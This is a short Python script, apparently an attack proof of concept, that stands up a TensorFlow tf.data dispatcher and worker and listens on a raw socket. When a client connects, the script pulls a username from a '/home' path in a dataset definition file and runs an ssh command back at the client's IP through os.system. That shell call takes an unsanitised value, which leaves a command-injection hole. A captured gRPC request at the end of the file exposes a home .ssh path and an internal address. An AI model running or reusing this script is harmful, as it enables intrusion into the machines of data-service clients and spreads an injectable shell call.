import socket
import os
import tensorflow as tf
#创建一个TCP/IP socket对象
server_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 绑定socket到本地IP和端口
server_address=('0.0.0.0',1236)
server_socket.bind(server_address)

dispatcher = tf.data.experimental.service.DispatchServer(config=tf.data.experimental.service.DispatcherConfig(port=1238))
print("config = ", dispatcher._config)
dispatcher_address = dispatcher.target.split("://")[1]
worker = tf.data.experimental.service.WorkerServer(
    tf.data.experimental.service.WorkerConfig(
        dispatcher_address=dispatcher_address))
print("dispatcher.target = ", dispatcher.target, type(dispatcher.target))
print("wait for link to 10.214.148.18:1238 ...")

#监听socket
server_socket.listen(50)
while True:
# 等待客户端连接
    print('等待客户端连接...')
    client_socket, client_address =server_socket.accept()
    print('接收到客户端连接:', client_address)

    while True:
    #接收客户端发送的数据
        data = client_socket.recv(1024)
        if not data:
            break
        print('接收到客户端数据:', data)

        with open("./dataset/dataset_def.proto", "rb") as f:
            data = f.read()
            index_home = data.find(b"/home")
            index_name = data.find(b":", index_home + 1)
            name = data[index_home + 6 : index_name].decode()

            command = "ssh " + name + "@" + client_address[0]
            print(command)
            os.system(command)
        
        
        


# data = b'\x00\x01\x18\x01\x04\x00\x00\x00\x01\x86\x83@\n:authority\x1210.214.148.18:1234@\x05:path\x1f/tensorflow.rpc.RpcService/Call@\x02te\x08trailers@\x0ccontent-type\x10application/grpc@\nuser-agent9grpc-c++/1.27.0-dev grpc-c/9.0.0 (linux; chttp2; guantao)@\x14grpc-accept-encoding\x15identity,deflate,gzip@\x0faccept-encoding\ridentity,gzip@\x0cgrpc-timeout\x04101S\x00\x00\x04\x08\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00(\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00#\n\x0f/home/neil/.ssh\x12\x07\x08\x03\x12\x00:\x01\x02\x12\x07\x08\x03\x12\x00:\x01\x02\x00\x00\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x05'